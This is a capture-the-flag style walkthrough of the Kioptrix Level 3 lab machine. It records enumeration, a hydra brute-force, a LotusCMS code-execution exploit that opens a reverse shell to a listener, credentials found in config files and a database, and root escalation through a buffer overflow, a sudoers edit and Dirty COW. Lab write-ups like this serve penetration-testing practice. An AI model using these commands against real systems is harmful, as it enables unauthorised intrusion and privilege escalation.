# Port 80 (HTTP)
1. Feroxbuster enumerated some dirs
	```
	301        9l       31w      351c http://192.168.1.95/cache
	301        9l       31w      350c http://192.168.1.95/core
	403       10l       33w      323c http://192.168.1.95/data
	200        6l       30w    23126c http://192.168.1.95/favicon.ico
	301        9l       31w      353c http://192.168.1.95/gallery
	200       39l      190w     1819c http://192.168.1.95/index.php
	301        9l       31w      353c http://192.168.1.95/modules
	301        9l       31w      356c http://192.168.1.95/phpmyadmin
	403       10l       33w      332c http://192.168.1.95/server-status
	301        9l       31w      351c http://192.168.1.95/style
	200        1l        2w       18c http://192.168.1.95/update.php
	```
1. Found a webpage
	![[kioptrix - L3 index page.png|500]]
2. Proceed to Blog, found a username
	![[kioptrix - L3 blog.png|500]]
	- loneferret
3. Proceed to Login,
	- Running on LotusCMS
	![[kioptrix - L3 login .png|500]]
	- Tried SQLi, failed
	- Tried LFi, failed
4. Bruteforce user `loneferret`
	```
	hydra -l loneferret -P /usr/share/wordlists/rockyou.txt 192.168.1.95 http-post-form "/index.php?system=Admin&page=loginSubmit:username=^USER^&password=^PASS^:Incorrect username or password." -o "/root/vulnHub/kioptrix3/192.168.1.95/scans/tcp80/tcp_80_http_auth_hydra.txt"
	```
	- Failed
5. Search for exploits for LotusCMS, Found 2
	- https://packetstormsecurity.com/files/122161/LotusCMS-3.0-PHP-Code-Execution.html
	- https://github.com/Hood3dRob1n/LotusCMS-Exploit
6. Exploit & obtain www-data shell
	```
	python lotus_eval.py <target IP> <Directory> <Listening Host> <Listening Port>
	python lotus_eval.py 192.168.1.95 / 192.168.1.1 4444
	```
	![[kioptrix - L3 www-data shell obtained.png|999]]
	
# Privilege Escalation to loneferret via creds found in file
 1. Find credentials to phymyadmin 
	```
	grep -Rnw /home/www/kioptrix3.com/* -ie "Incorrect" --color=always 2>/dev/null
	```
	![[kioptrix - L3 config file.png]]
	![[kioptrix - L3 config file 2.png|999]]
2. View `/gconfig.php`
	```
	cat /home/www/kioptrix3.com/gallery/gconfig.php
	```
	![[kioptrix - L3 config file 3.png|999]]
	- root:fuckeyou
3. Access phpmyadmin with root:fuckeyou, under gallery database found credentials
	![[kioptrix - L3 user creds.png]]
4. Crack it with hashcat
	```
	hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
	```
	 ![[kioptrix - L3 cracked hash.png|999]]
	 - dreg: Mast3r
	 - loneferret:starwars
 
# Privilege Escalation to Root - 1 via Vulnerable program + Buffer Overflow
1. Check for sudo access
	![[kioptrix - L3 loneferret sudo access.png|500]]
2. Run HT
	![[kioptrix - L3 error.png|500]]
3. Fix the error
	- https://askubuntu.com/questions/1091553/how-do-i-fix-error-opening-terminal-unknown-on-ubuntu-server
	```
	export TERM=linux
	```
	![[kioptrix - L3 HT editor.png|500]]
4. Find exploits for that version
	- https://www.exploit-database.net/?id=17836
	- A bufferoverflow exploit where EIP is overwritten into spawning a root shell
5. Exploit
	```
	python exploit.py > output
	sudo ht $(cat output)
	```
	![[kioptrix - L3 root shell obtained.png|500]]
6. Copy over ssh key & ssh into root
	```
	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeiQIVUawX98au7XzxT8GIdr2FNcZxtxpyDU/namDaT0Crzz89eCReUAI9q7DgaaImpg07Tuhaq5w96VmjMCtIvRCXhipldxIsBCEVE5v4E1T8YplDmHZHVLHTESaHBTpnx3uTeQurjVKVwiGjgazfp8NkGk9UTmHlBqjc6XUvYifpEKuSUPzb9+TuwyCyoyWeM6iRyy2f+1xRqeca7PIsPtp7nKwcpDzMCH9uXMKZFXBU4GedcDgL5rFMWONq6GdivuY+oflxlukJrnFn8Y/roNqjtwntXKnV+dkCXjI8zLly7V1nt7W3U+kLzUgem3uso18RCoCTJLf+XlrF0PGuiuIGP3zZVuadrYm5VdDwbgOSUcUL3Zu+FU1W1wC2QE0EhhgBWXrwBQuIZiq4rFRo9RuxoFl42YyFgGugmV405/ROAXypR+M7vT5JnUt/7Zs4Y2lmapKY8rS93EPZIfurBCzB2YUNyNBbrZHyxAj/5I9iLqdRPvyI22NoRTz7U9s= root@kali" > .ssh/authorized_keys
	```
7. Flags
	![[kioptrix - L3 flags.png|500]]	
	
# Privilege Escalation to Root - 2 via SUDO 
1. Edit the `/etc/sudoers` file with HT editor
	```
	sudo ht
	ALT + F > Open > /etc/sudoers
	```
	![[kioptrix - L3 select sudoers file.png|500]]
2. Delete `!/usr` from `!/usr/bin/su`
	![[kioptrix - L3 edited sudoers.png|500]]
3. Save & Exit
	```
	ALT + F > Save > Quit
	```
	![[kioptrix - L3 edited successfully.png]]
4. Switch to root
	```
	sudo /bin/su
	```
	![[kioptrix - L3 root shell obtained 2.png]]
	
# Privilege Escalation to Root - 3 via Kernel Exploit
1. Ran linpeas
	![[kioptrix linpeas output.png]]
	- Linux version 2.6.24
2. Search for exploits	
	- https://www.exploit-db.com/exploits/40839
3. Transfer exploit to target & exploit
	```
	gcc -pthread dirty.c -o dirty -lcrypt
	```
	![[kioptrix - L3 kernel exploit.png]]
4. Switch user to firefart & access root files
	![[kioptrix - L3 root shell obtained 3.png]]


---
Tags: #tcp/80-http/web-app-cms-exploit #tcp/80-http/rce  #linux-priv-esc/linux-creds-found #linux-priv-esc/vulnerable-bin #linux-priv-esc/kernel-exploit 

---

	
